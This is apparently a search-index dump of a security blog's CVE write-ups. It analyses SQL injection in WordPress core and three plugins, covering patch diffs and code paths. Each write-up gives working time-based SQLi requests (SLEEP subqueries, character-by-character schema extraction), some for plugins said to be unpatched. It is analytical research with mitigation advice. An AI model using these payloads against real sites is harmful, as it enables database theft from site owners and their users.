POC","uri":"/posts/2025-10-01-cve-2022-21661/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff WordPress is an open-source project with a public GitHub repository, meaning all patches are committed openly. To analyze a vulnerability, we can simply review the related commit and observe the code changes. The reference for CVE-2022-21661 links to this commit: Patch diff between versions The vulnerability was fixed in src/wp-includes/class-wp-tax-query.php Vulnerable Code $query['terms'] = array_unique( (array) $query['terms'] ); Casts $query['terms'] to an array and removes duplicates. No type checking or sanitization — allowing injection of malicious values into the SQL query. Example: $args = [ 'post_type' =\u003e 'post', 'tax_query' =\u003e [ [ 'taxonomy' =\u003e 'category', 'field' =\u003e 'term_taxonomy_id', 'terms' =\u003e ['1) AND (SELECT SLEEP(5)) # '], 'operator' =\u003e 'IN', ], ], ]; Patched Code if ( 'slug' === $query['field'] || 'name' === $query['field'] ) { $query['terms'] = array_unique( (array) $query['terms'] ); } else { $query['terms'] = wp_parse_id_list( $query['terms'] ); } Added a conditional check based on $query['field']: If it’s slug or name → keep the old behavior. If it’s an ID → use wp_parse_id_list() to cast all elements into an integer array safely. This ensures that for tax_query fields such as term_taxonomy_id and term_id, which correspond to BIGINT UNSIGNED columns, only numeric values are used. mysql\u003e DESC wp_term_taxonomy; +------------------+-----------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +------------------+-----------------+------+-----+---------+----------------+ | term_taxonomy_id | bigint unsigned | NO | PRI | NULL | auto_increment | | term_id | bigint unsigned | NO | MUL | 0 | | | taxonomy | varchar(32) | NO | MUL | | | | description | longtext | NO | | NULL | | | parent | bigint unsigned | NO | | 0 | | | count | bigint | NO | | 0 | | +------------------+-----------------+------+-----+---------+----------------+ ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works Breakpoint at clean_query start Continue to matching taxonomy query Observe wp_list_pluck overwriting terms Prevent overwrite with early return Payload remains in executed query Flow WP_Query object created WP_Query constructor called get_posts invoked to run query Condition satisfied, get_sql called get_sql returns get_sql_clauses get_sql_clauses calls get_sql_for_query Iterate query array in get_sql_for_query Checks terms, taxonomy, operator keys... Calls get_sql_for_clause Bypass clean_query, payload preserved Payload assigned to $sql\\['where'] Parentheses added to WHERE clause Adds AND and returns SQL get_posts receives SQL Payload merged into $clauses\\['where'] Observe last_query where SQL executes Execution Flow Diagram Execution flow of WP_Query leading to SQLi ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works Breakpoint at clean_query start Continue to matching taxonomy query Observe wp_list_pluck overwriting terms Prevent overwrite with early return Payload remains in executed query Flow WP_Query object created WP_Query constructor called get_posts invoked to run query Condition satisfied, get_sql called get_sql returns get_sql_clauses get_sql_clauses calls get_sql_for_query Iterate query array in get_sql_for_query Checks terms, taxonomy, operator keys... Calls get_sql_for_clause Bypass clean_query, payload preserved Payload assigned to $sql\\['where'] Parentheses added to WHERE clause Adds AND and returns SQL get_posts receives SQL Payload merged into $clauses\\['where'] Observe last_query where SQL executes Execution Flow Diagram Execution flow of WP_Query leading to SQLi ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit Replace terms value with an SQLi payload: GET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1 Response shows delay caused by payload execution ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2022-21661 vulnerability in WordPress Core, prior to version 5.8.3 (affecting versions back to 3.7.37), stems from improper sanitization in WP_Query, leading to a potential SQL Injection vulnerability. ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References SQL Injection cheat sheet - PortSwigger CVE-2022-21661 Detail ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:6:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Notes ","date":"2025-10-01","objectID":"/posts/2025-10-01-cve-2022-21661/:7:0","tags":["analyst","plugin","sqli"],"title":"CVE-2022-21661 Analysis \u0026 POC","uri":"/posts/2025-10-01-cve-2022-21661/#notes"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Depicter Slider Plugin.","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Depicter Slider WordPress plugin prior to version 3.6.2. This could allow an attacker to directly interact with your database, potentially leading to data theft or manipulation. CVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Depicter Slider: v3.6.1 (vulnerable) and v3.6.2 (patched) Diff tool: meld or any other comparison tool to visualize differences between versions ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The root cause is that the application directly injects data from a GET request into the SQL query without proper sanitization or escaping. ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. A notable difference appears in app/src/Controllers/Ajax/LeadsAjaxController.php. index, list, and export are three key functions inside the LeadsAjaxController class. public function index(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::lead()-\u003eget($args); $statusCode = isset($response['errors']) ? 400 : 200; return \\Depicter::json($response)-\u003ewithStatus($statusCode); } public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } public function export(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), // other logic ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); // other logic return \\Depicter::json([ 'errors' =\u003e [__('error occurred during the export process', 'depicter')] ])-\u003ewithStatus(400); } All three functions were patched by replacing Sanitize::textfield with Sanitize::sql, ensuring the 's' parameter is properly sanitized and SQL-escaped. Illustration of patched vs vulnerable code differences ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works To understand how textfield and sql functions behave, search for the keyword function textfield. They likely reside in the same file since both are called from the same class Sanitize. If you have the PHP Intelephense Extension installed in VSCode, you can navigate directly to the function definition using Ctrl + Click. Searching for textfield function in Sanitize class textfield returns data sanitized by sanitize_text_field, while sql returns SQL-escaped data using esc_sql(). public static function sql( $input ) { return esc_sql( $input ); } Since this is an unauthenticated vulnerability, we need to identify which of the three functions are called without any authentication mechanism. Once confirmed, we can trace deeper into the logic to verify potential SQL injection exploitation. Searching directly by function names like index, list, or export may yield too many results. Instead, search for the class name LeadsAjaxController since all functions must be invoked through it. Searching for LeadsAjaxController usage in source code 👉 The LeadsAjaxController is used during Ajax route registration. When a request is sent to /wp-admin/admin-ajax.php?action=action_here\u0026param1=..., WordPress maps the request via handle('LeadsAjaxController@function') to the corresponding method. All three functions are invoked using the GET method, but export includes a csrf-api middleware, so we can exclude it. We’ll focus only on index and list. When analyzing index, we see that $response calls \\Depicter::lead()-\u003eget($args), which internally calls \\Depicter::leadRepository()-\u003egetResults($args). This is the same logic as list, so list is our main tracing point. public function list(RequestInterface $request, $view) { $args = [ 's' =\u003e Sanitize::textfield($request-\u003equery('s', '')), 'ids' =\u003e Sanitize::textfield($request-\u003equery('ids', '')), 'sources' =\u003e Sanitize::textfield($request-\u003equery('sources', '')), 'dateStart' =\u003e Sanitize::textfield($request-\u003equery('dateStart', '')), 'dateEnd' =\u003e Sanitize::textfield($request-\u003equery('dateEnd', '')), 'order' =\u003e Sanitize::textfield($request-\u003equery('order', 'DESC')), 'orderBy' =\u003e Sanitize::textfield($request-\u003equery('orderBy', 'id')), 'page' =\u003e Sanitize::int($request-\u003equery('page', 1)), 'perPage' =\u003e Sanitize::int($request-\u003equery('perpage', 10)), 'columns' =\u003e Sanitize::textfield($request-\u003equery('columns', '')), 'includeFields' =\u003e Sanitize::textfield($request-\u003equery('includeFields', false)), 'skipCustomFields' =\u003e Sanitize::textfield($request-\u003equery('skipCustomFields', false)) ]; $response = \\Depicter::leadRepository()-\u003egetResults($args); return \\Depicter::json($response); } To understand how getResults executes its query, search for function getResults or use Ctrl + Click on getResults. Definition of getResults function in LeadRepository class 👉 Two getResults functions appear. Based on the class name LeadRepository and the leadRepository() function, it’s likely that Depicter::leadRepository() returns an instance of LeadRepository. The correct function can be confirmed by checking the number of parameters. The if condition shows that when includeFields is empty, getLeadsResults is called. Let’s look at it: protected function getLeadsResults( $args ){ // Purpose of joining tables is being able to search in leadField values as well $leadTable = $this-\u003elead()-\u003egetTable(); $leads = Lead::new()-\u003eselect( \"{$leadTable}.id\", \"{$leadTable}.source_id\", \"{$leadTable}.content_id\", \"{$leadTable}.content_name\", \"{$leadTable}.created_at\", \"lf.name as fieldName\", \"lf.value as fieldValue\" )-\u003ejoin( \"{$this-\u003eleadField()-\u003egetTable()} AS lf\", \"{$leadTable}.id\", \"=\", \"lf.lead_id\" ); // other logic if( ! empty( $args['s'] ) ){ $search = \"'%\". $args['s'] .\"%'\"; $leads-\u003eappendRawWhere('AND', \"( lf.value like {$search} OR {$leadTable}.content_name like {$search} )\"); } $results = $this-\u003epaginate( $leads, $args ); } Here, the s parameter (which the patch protects) is concatenated directly into the query using appendRawWhere. Part of t","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi Send a GET request with a time-based SQLi payload: GET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026s=999%25'+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Decoded payload: 999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- - This makes part of the query: AND (lf.value like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- ' OR leadtable.content_name like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #') Response time showing the payload execution 👉 The delayed response confirms the injection worked. Subquery in FROM clause: The subquery acts as a temporary table, forcing MySQL to execute it first, delaying the main query execution. ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name To fully dump data, we must first confirm we can extract at least one character of the database name. Send a request with the following SQLi payload: GET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026s=999%25'+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here SUBSTRING() extracts the first letter of the database name, and IF() triggers SLEEP(5) if the first character equals 0x77 ('w'). Hex encoding (0x77) is used because s originates from a GET parameter and is escaped by magic quotes and sanitize_text_field in WordPress. 👉 The delayed response confirms the first character is indeed w. ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-2011 vulnerability in the WordPress Depicter Slider plugin (prior to version 3.6.2) arises from unvalidated user input being directly injected into SQL queries, leading to SQL Injection. The patch introduces SQL escaping, ensuring injected data is safely encapsulated within '%...%' strings. Key takeaways: Always validate and sanitize user input. Use $wpdb-\u003eprepare() when handling database queries in WordPress. Keep plugins updated and conduct regular security audits to reduce exposure. ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References SQL Injection Cheat Sheet - PortSwigger WordPress Depicter Slider Plugin \u003c= 3.6.1 is vulnerable to SQL Injection ","date":"2025-09-30","objectID":"/posts/2025-09-30-cve-2025-2011/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-2011 Analysis \u0026 POC","uri":"/posts/2025-09-30-cve-2025-2011/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Woocommerce Partial Shipment plugin for WordPress prior to version 3.3. It allows attackers to directly interact with the database, potentially leading to data theft and other attacks. CVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.2 CVSS Severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Woocommerce Partial Shipment: v3.2 (vulnerable) and v3.3 (patched) Diff Tool: meld or any comparison tool to view differences between versions Activated WooCommerce Plugin: must be activated before installing Woocommerce Partial Shipment Plugin, since several WooCommerce functions are used. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The root cause lies in directly injecting POST request data into an SQL query without proper sanitization or validation. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. A significant difference appears in wc-partial-shipment/woocommerce-partial-shipment.php. However, since the developer made many changes, locating the vulnerable line can be difficult. In WordPress, for SQLi to occur, the application must interact with the database using the global variable $wpdb. Searching for this keyword inside wc-partial-shipment/woocommerce-partial-shipment.php helps identify possible sinks. Sink location found in source code get_shipment_id and get_wxp_shipment_data are two functions in the WXP_Partial_Shipment class that directly insert user input into SQL queries without validation, making them vulnerable to SQL Injection. Comparison between vulnerable and patched version The patch uses $wpdb-\u003eprepare() to safely construct SQL queries instead of direct string concatenation with user input. This ensures all values are properly escaped before being inserted into the SQL query, effectively mitigating SQL Injection risks. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works Both get_shipment_id and get_wxp_shipment_data are called by the function wxp_order_set_shipped within the same class. function wxp_order_set_shipped(){ $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0; // other logic $wxp_shipment = $this-\u003eget_wxp_shipment_data($order_id); if(isset($_POST['order_id']) \u0026\u0026 $_POST['order_id']){ global $wpdb; $shipment_id = $this-\u003eget_shipment_id($_POST['order_id']); if(!$shipment_id){ $data = array( 'order_id' =\u003e$order_id, 'shipment_id' =\u003e1, 'shipment_url'=\u003e'', 'shipment_num'=\u003e'', 'shipment_date'=\u003ecurrent_time('timestamp',0), ); $wpdb-\u003einsert($wpdb-\u003eprefix.\"partial_shipment\",$data,array('%d','%d','%s','%s','%s')); $shipment_id = $wpdb-\u003einsert_id; } // other logic } echo json_encode(array('order_id'=\u003e$order_id,'status'=\u003e$status_key)); exit(); } 👉 The order_id parameter is taken directly from the POST request, making it user-controlled and allowing it to be passed into vulnerable SQL queries within get_shipment_id and get_wxp_shipment_data. To find where wxp_order_set_shipped is called, search for the keyword wxp_order_set_shipped inside the plugin directory. Location of wxp_order_set_shipped function call wxp_order_set_shipped is registered in the class constructor as a callback for the wp_ajax_wxp_order_set_shipped hook, meaning it can be triggered by authenticated users. 👉 Accessing /wp-admin/admin-ajax.php with the parameters: action=wxp_order_set_shipped\u0026order_id=payload_here will trigger the following: The callback wxp_order_set_shipped executes. order_id is taken directly from the request and inserted into SQL queries. The query executes twice due to its usage in two separate SQL calls containing the malicious payload. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detecting SQLi Send a POST request containing an SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) This results in the query: SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Because the query executes twice, the response time doubles. Response time after successful exploitation A subquery in the FROM clause is used because MySQL treats it as a temporary table. The subquery executes once to create the temporary table, and the main query runs afterward. This ensures the SLEEP function runs only once instead of being multiplied across multiple comparisons. For example, using the following payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT SLEEP(5)) The response time increases exponentially. Exponential response time increase ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#detecting-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Extracting the First Letter of the Database Name The first step in data extraction is confirming at least one character of the database name — once retrieved, the rest can be dumped easily. Send a request with the following SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) Here, SUBSTRING() extracts the first letter of the database name, and IF() triggers SLEEP(5) if it equals 0x77 (‘w’). Hex encoding (0x77) is used for 'w' because the order_id parameter, being a POST value, is escaped by magic quotes and sanitize_text_field in WordPress. 👉 Based on the delayed response, we confirm that the first character is 'w'. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#extracting-the-first-letter-of-the-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-48118 vulnerability in the WordPress Woocommerce Partial Shipment plugin (versions before 3.3) originates from directly inserting unsanitized user input into SQL queries, resulting in a SQL Injection vulnerability. No official patch has been released at the time of writing. Key Takeaways: Always validate and sanitize user input. Use $wpdb-\u003eprepare() for database operations in WordPress to prevent SQL Injection. Keep plugins updated and perform regular security audits to avoid being an attack target. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References SQL Injection Cheat Sheet - PortSwigger WordPress Woocommerce Partial Shipment Plugin \u003c= 3.2 vulnerable to SQL Injection ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Torod Plugin.","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Torod plugin for WordPress. This could allow attackers to directly interact with your database, including but not limited to stealing information. CVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.9 Fixed in: \u003c= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Torod: v1.9 ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The core cause is that the application directly inserts data from a POST request into an SQL query without proper input validation or control mechanisms. ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Sink This CVE has no patch available, so we cannot use a diff tool to compare the vulnerable and fixed versions. In WordPress, for SQLi to occur, the application must interact with the database through the global variable $wpdb. We can search for this keyword in the plugin directory to locate the sink. Locate the sink in code 👉 The data from $_POST['country_id'] is directly inserted into the SQL query without proper validation. Using sanitize_text_field() only escapes the string, not fully sanitizing it. Therefore, the SQL Injection vulnerability can occur. Source: $_POST['country_id'] Sink: $wpdb-\u003eget_results(\"SELECT * FROM $table_name WHERE country_id = $country_id\") ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#vulnerable-sink"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works? The vulnerability lies in the get_regions_and_cities function of the ajaxyk class within the inc/ajaxyk.php file. To determine where it’s called, we search for the keyword get_regions_and_cities within the plugin directory. Find the get_regions_and_cities function 👉 get_regions_and_cities is registered as a callback for two action hooks via the add_action function in the ajaxyk constructor. wp_ajax_get_regions_and_cities Written in the format wp_ajax_{$action} Requires user authentication wp_ajax_nopriv_get_regions_and_cities Written in the format wp_ajax_nopriv_{$action} Does not require authentication Since this is an unauthenticated vulnerability, we only focus on the wp_ajax_nopriv_get_regions_and_cities hook. Thus, when a POST request is sent to /wp-admin/admin-ajax.php with parameters: action=wp_ajax_nopriv_get_regions_and_cities\u0026country_id=payload_here The get_regions_and_cities callback is triggered. country_id is taken directly from the request and injected into the SQL query. The query executes with the malicious payload. ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detecting SQLi Send a POST request containing the SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) The resulting query becomes: SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) Response time result 👉 Based on the response time =\u003e the payload works. Techniques usable when the table is empty: UNION: Since it does not depend on existing data in the table, but requires knowing the number of columns. Subquery: Subquery in WHERE clause: MySQL may optimize and skip the subquery if the result can be determined early. If the table has no data, MySQL might not execute SLEEP(). Subquery in FROM clause: The subquery is treated as a temporary table. MySQL must execute it first to build the temp table before executing the main query. SQL execution order ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#detecting-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get the First Letter of Database Name The prerequisite to dump all data is to retrieve at least one character of the database name. Once that is achieved, the rest can be enumerated. Send a request with the SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) Here, SUBSTRING() extracts the first character of the database name, and IF() triggers SLEEP(5) if that character is 0x77 (‘w’). We use the hex encoding 0x77 for w because country_id is taken from a POST request, which is escaped by magic quotes in WordPress and by sanitize_text_field. 👉 Based on response time =\u003e the first character is confirmed to be w. ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#get-the-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-30936 vulnerability in the WordPress Torod plugin (version ≤ 1.9) stems from directly inserting user input into an SQL query without proper validation, leading to a classic SQL Injection flaw. No official patch has been released for this vulnerability yet. Key takeaways: Always validate and sanitize user input properly. Always use $wpdb-\u003eprepare() when interacting with the database in WordPress to prevent SQL Injection. Keep plugins up-to-date and perform regular security assessments to avoid being targeted. ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References SQL Injection Cheat Sheet - PortSwigger WordPress Torod Plugin \u003c= 1.9 is vulnerable to SQL Injection ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress MyStyle Custom Product Designer 